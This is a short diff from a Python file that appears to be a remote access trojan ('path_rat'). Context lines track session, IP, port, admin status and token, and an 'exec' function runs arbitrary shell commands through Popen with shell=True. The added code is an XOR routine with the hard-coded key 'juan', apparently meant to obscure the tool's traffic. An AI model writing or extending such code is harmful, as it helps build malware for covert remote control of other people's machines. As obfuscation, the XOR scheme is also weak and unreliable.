@@ -19,6 +19,23 @@ SOCK_TIMEOUT = 4
 
 SPLIT = "|SPLIT|"
 #session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
+def XOREncryption(data):
+    key =["j","u","a","n"] 
+    result = ""
+    print("LEN DATA: ",len(data))
+    for x in range(len(data)):
+       
+        current = data[x]
+        #print("CURRENT: ",current)
+        #print("CMPT:",x)
+
+        current_key  = key[x % len(key)]
+        #print("CURRENT KEY:", current_key)
+        
+        result+= chr(ord(current) ^ ord(current_key))
+        print("result char xor: ",result[x],"cmpt: ",x)
+    
+    return result
 
 def exec(command):
     with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
